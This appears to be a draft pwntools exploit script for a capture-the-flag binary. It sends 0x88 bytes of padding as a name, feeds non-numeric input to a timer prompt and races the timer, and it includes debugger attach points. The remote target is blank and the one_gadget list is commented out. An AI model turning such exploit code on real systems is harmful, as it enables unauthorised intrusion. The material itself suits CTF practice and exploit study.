from pwn import *
import time
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc-2.31.so')
elf = ELF('./pwn')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./pwn')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

name = b'a' * 0x88
p()
io.sendlineafter(b"name?\n> ",name)

io.sendlineafter(b"want to try?\n> ",str(2).encode())
#io.sendlineafter(b"Time[sec]: ",str(1).encode())
io.sendlineafter(b"Time[sec]: ",b'a')
p()
io.sendafter(b"Press ENTER to start / stop the timer.",b'\n')
start_time = time.time()
io.recvuntil(b"started.")
while time.time() - start_time < 0.0001:  # 循环等待，直到达到指定的时间
    pass
io.sendline()
io.sendlineafter(b"Play again? (Y/n)",b'A')

# 2
#io.sendlineafter(b"Time[sec]: ",str(1).encode())
io.sendlineafter(b"Time[sec]: ",b'a')
io.sendafter(b"Press ENTER to start / stop the timer.",b'\n')
io.recvuntil(b"started.")
time.sleep(1)
p()
io.sendline()
io.sendlineafter(b"Play again? (Y/n)",b'A')

io.interactive()

